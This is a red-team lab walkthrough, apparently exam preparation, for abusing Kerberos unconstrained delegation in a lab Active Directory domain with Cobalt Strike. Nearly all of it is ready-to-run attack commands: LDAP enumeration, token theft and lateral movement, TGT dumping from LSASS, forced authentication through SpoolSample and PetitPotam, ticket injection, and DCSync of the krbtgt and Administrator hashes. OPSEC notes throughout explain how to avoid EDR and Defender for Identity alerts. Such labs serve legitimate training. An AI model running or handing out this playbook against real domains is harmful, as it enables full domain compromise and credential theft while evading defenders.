# Unconstrained Delegation Kerberos Lab  

>The objective of this lab is to abuse unconstrained delegation to obtain the TGT of a domain administrator.  

>Unconstrained delegation allows a service/computer to impersonate any user to any service in the domain.  
>When a user authenticates to a host with unconstrained delegation enabled, their TGT is embedded in the service ticket and cached in LSASS on that host.  
>An attacker who compromises that host can extract those TGTs and reuse them, impersonating any user who authenticated there, including Domain Admins.  
>Unconstrained delegation is the most permissive and dangerous form of delegation because there's no restriction on which services the ticket can be forwarded to.  
  
===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Use LDAP to find computers configured for unconstrained delegation.

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
    ```

> `OPSEC-🟢SAFE` — ldapsearch runs as a BOF (inline, no child process, no disk write).

⚠️ Domain Controllers always have unconstrained delegation and are not a viable attack path, but you should see an additional machine - *lon-ws-1$*.

1. Impersonate *rsteel* and move laterally to *lon-ws-1*.

> **Why lon-ws-1?** It is the host configured for unconstrained delegation. You need a beacon **on that host** to harvest TGTs from users who authenticate to it.

**Option A — steal_token (preferred if rsteel has a running process on current host)** `OPSEC-🟢SAFE`

```cs
beacon> ps                              // find a process owned by rsteel
beacon> steal_token <pid>              // duplicate token in-process, no spawn, no Event 4648
beacon> powerpick Test-WSMan lon-ws-1  // verify WinRM reachable
beacon> jump winrm64 lon-ws-1 smb     // inject into wsmprovhost.exe — no service, no Event 7045
beacon> rev2self                       // drop token on original beacon after jump succeeds
```

**Option B — TGT injection (if rsteel TGT is cached on this host)** `OPSEC-🟢SAFE` dump / `OPSEC-🟠CAUTION` make_token

```cs
beacon> krb_triage                             // confirm rsteel TGT is cached
beacon> krb_dump /user:rsteel /service:krbtgt  // BOF — Kerberos API, no raw LSASS read
// Copy the base64 blob from beacon output

beacon> make_token CONTOSO\rsteel FakePass     // Type 9 logon session — Event 4648 logged
                                               // password is irrelevant, ticket overrides cred
beacon> kerberos_ticket_use <base64-tgt-blob>  // inject TGT in-memory — no disk write
beacon> jump winrm64 lon-ws-1 smb
beacon> rev2self
```

**Option C — make_token with known plaintext** `OPSEC-🟠CAUTION`

```cs
beacon> make_token CONTOSO\rsteel <password>   // Event 4648 logged
beacon> jump winrm64 lon-ws-1 smb
beacon> rev2self
```

> Verify you landed on lon-ws-1 before proceeding:
> ```cs
> beacon> getuid
> beacon> pwd
> ```
> Escalate to SYSTEM on lon-ws-1 if needed — `krb_dump` requires SYSTEM to read other users' tickets.

===

## Exploitation

Two strategies depending on whether a privileged TGT is already cached or needs to be coerced.

---

### Strategy A — Passive: Harvest Cached TGTs (BOF approach)

Use when a high-value user has already authenticated to the unconstrained delegation host.

On the new Beacon on *lon-ws-1*:

1. Triage tickets — runs as BOF, no process spawn.

    ```Beacon-nocolor
    krb_triage
    ```

    > `OPSEC-🟢SAFE` — BOF runs in beacon thread via `inline-execute`. No child process spawned.

⚠️ You should see at least one from **dyork@CONTOSO.COM**.

2. Confirm that dyork is a Domain Admin.

    ```Beacon-nocolor
    ldapsearch samAccountName=dyork --attributes memberOf
    ```

3. Dump the TGT via BOF (uses `LsaCallAuthenticationPackage` Kerberos API — not a raw LSASS memory read).

    ```Beacon-nocolor
    krb_dump /user:dyork /service:krbtgt
    ```

    > `OPSEC-🟠CAUTION` — Interacts with LSASS via the Kerberos API (LsaCallAuthenticationPackage / KerbRetrieveEncodedTicketMessage). Less noisy than sekurlsa / direct LSASS read, but LSASS is still the endpoint. EDR hooks on LsaCallAuthenticationPackage will see this call.

4. Use the TGT to impersonate dyork and verify DA access to *lon-dc-1*.

> dyork's TGT base64 blob is in your beacon output from step 3. It does **not** need to be written to disk.

```cs
// Create a sacrificial logon session to inject into — password is irrelevant
beacon> make_token CONTOSO\dyork FakePass        // OPSEC-🟠CAUTION — Event 4648 logged
                                                 // Type 9 logon (network only) — no interactive session created

// Inject the TGT into current beacon token context
beacon> kerberos_ticket_use <base64-dyork-tgt>  // OPSEC-🟢SAFE — in-memory injection, no disk write

// Confirm ticket loaded
beacon> run klist                                // OPSEC-🟠CAUTION — spawns klist.exe child process
                                                 // Alternative: krb_triage (BOF — no spawn) OPSEC-🟢SAFE

// Verify DA access — list DC C$ share
beacon> ls \\lon-dc-1\c$                        // OPSEC-🟢SAFE — built-in beacon command, no child process
                                                 // Generates CIFS service ticket request (TGS-REQ to DC)
                                                 // and Event 5140 (network share access) on lon-dc-1

// From here: DCSync, dump further credentials, or move laterally as dyork
beacon> dcsync contoso.com CONTOSO\krbtgt        // OPSEC-🟠CAUTION — Event 4662 replication event on DC
beacon> dcsync contoso.com CONTOSO\Administrator

// Clean up impersonation when done
beacon> rev2self                                 // OPSEC-🟢SAFE — drops token, restores beacon identity
```

> **If `ls \\lon-dc-1\c$` returns Access Denied** — the TGT injection did not take effect or the ticket expired. Re-run `kerberos_ticket_use` with a fresh dump. TGTs are valid for 10h from issue time — check `EndTime` in krb_dump output.

---

### Strategy B — Active: Coerce Authentication via Printer Bug (SpoolSample)

Use when no high-value TGT is cached — force a DC or DA workstation to send its TGT to your controlled host.  
Combining coercion with `Rubeus monitor` captures the ticket via SSPI **before** it is written to the LSASS cache, avoiding any LSASS interaction entirely.

#### Step 1 — Start Rubeus monitor on the unconstrained delegation host

On the beacon running as SYSTEM on *lon-ws-1*, launch Rubeus monitor in a background job:

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus.exe monitor /interval:5 /nowrap /filteruser:lon-dc-1$
```

> `OPSEC-🟠CAUTION` — `execute-assembly` uses fork-and-run (spawns sacrificial process configured by `spawnto`). Ticket capture itself uses Windows SSPI/Kerberos API — no LSASS memory read. Set `spawnto` to `dllhost.exe` in your malleable profile before running.

⚠️ `/filteruser` limits capture to the target computer account TGT only — reduces noise and output volume.

#### Step 2 — Trigger coercion from a beacon on any domain-joined host

**Option 1 — MS-RPRN (SpoolSample / PrinterBug):**

```Beacon-nocolor
execute-assembly C:\Tools\SpoolSample\SpoolSample.exe lon-dc-1 lon-ws-1
```

> `OPSEC-🟠CAUTION` — Makes an authenticated RPC call to the Print Spooler service (`MS-RPRN`) on the target DC. Generates a 4648 logon event on the DC. Print Spooler must be running on the target (enabled by default on DCs in older environments).

**Option 2 — MS-EFSR (PetitPotam):**

```Beacon-nocolor
execute-assembly C:\Tools\PetitPotam\PetitPotam.exe lon-ws-1 lon-dc-1
```

> `OPSEC-🟠CAUTION` — Uses EfsRpc (MS-EFSR) to coerce DC authentication. Does not require Print Spooler. Generates EFS-related 5145 / NTLM auth events. Blocked by newer patches if EfsRpc is filtered, but `EfsRpcOpenFileRaw` alternatives exist.

#### Step 3 — Capture and import the TGT

Rubeus monitor output will display the base64-encoded TGT for `lon-dc-1$`.

Inject the captured TGT directly into a sacrificial logon session without writing to disk:

```Beacon-nocolor
make_token CONTOSO\FakeUser FakePass
kerberos_ticket_use <base64-ticket-from-rubeus-monitor>
```

> `OPSEC-🟢SAFE` — `kerberos_ticket_use` injects the ticket into the current beacon token context in-memory. No disk write. No child process.

#### Step 4 — DCSync using the DC machine account TGT

With the DC$ TGT injected, perform DCSync to extract the krbtgt hash:

```Beacon-nocolor
dcsync CONTOSO\krbtgt
```

> `OPSEC-🟠CAUTION` — DCSync generates a replication event (EventID 4662) on the DC. Defender for Identity / MDI will alert on replication requests from non-DC accounts. Avoid running this from a user account beacon if MDI is present; use the DC$ TGT to make it appear as legitimate replication traffic.

---

### OPSEC Comparison — TGT Extraction Methods

| Method | LSASS touch | Process spawn | Disk write | Noise level |
|--------|-------------|---------------|------------|-------------|
| `krb_dump` BOF | API (LsaCallAuthenticationPackage) | No (BOF) | No | OPSEC-🟠CAUTION |
| `Rubeus dump` | API (SSPI) | Yes (fork & run) | No | OPSEC-🟠CAUTION |
| `Rubeus monitor` + coercion | None | Yes (fork & run) | No | OPSEC-🟠CAUTION (coercion generates auth events) |
| `mimikatz sekurlsa` | Direct read | Yes | No | OPSEC-🔴UNSAFE |

**Exam recommendation:** Prefer `Rubeus monitor` + coercion (`SpoolSample` or `PetitPotam`) when you can control the timing. Use `krb_dump` BOF only when the TGT is already cached and you need it immediately. Never use `mimikatz sekurlsa` — flag the OPSEC cost before the exam grader does.

---

⚠️ In this lab, you have learned how to abuse unconstrained delegation to capture the TGT of another user using both passive harvest (BOF) and active coercion (SpoolSample / PetitPotam + Rubeus monitor), and how to inject and use the ticket without touching LSASS memory directly.
